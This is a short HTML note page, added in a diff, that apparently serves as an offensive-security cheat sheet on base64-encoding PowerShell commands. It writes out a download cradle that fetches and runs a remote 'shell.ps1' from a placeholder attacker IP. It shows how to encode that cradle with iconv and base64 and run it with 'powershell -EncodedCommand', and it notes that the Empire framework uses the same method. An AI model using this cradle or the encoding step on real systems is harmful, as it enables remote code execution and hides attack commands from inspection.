@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Base64 Encoded Requests</title>
+</head><body>If you can't use quotes or otherwise, you can base64 encode commands with the iconv util<br/>
+<br/>
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://&lt;IP&gt;:8000/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0<br/>
+<br/>
+and now in Windows/Powershell<br/>
+<br/>
+"powershell -EncodedCommand &lt;BASE64&gt;"<br/>
+<br/>
+Empire does this too and uses<br/>
+powershell -enc &#09;&#09;to run commands</body></html>
